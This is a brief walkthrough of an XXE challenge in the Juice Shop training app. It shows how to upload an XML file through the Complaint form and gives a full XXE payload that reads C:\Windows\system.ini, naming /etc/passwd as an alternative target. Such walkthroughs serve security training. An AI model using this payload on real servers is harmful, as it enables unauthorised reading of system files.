## XXE Data Access
### Challenge: Retrieve the content of C:\Windows\system.ini or /etc/passwd from the server.
### Category: XXE

While logged in as any user > Complaint > upload file

Submit an xml file with XXE injection, since it is a windows machine that juiceshop is running on currently we will pull the `system.ini` file.

```
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ELEMENT xxe ANY >
<!ENTITY xxe SYSTEM "file:///c:/Windows/system.ini" >]><xxe>&xxe;</xxe>
```

After clicking submit for the upload file. Use developer tools > `XHR` filter turned on. Check that the contents of `system.ini` file is being displayed on the response tab.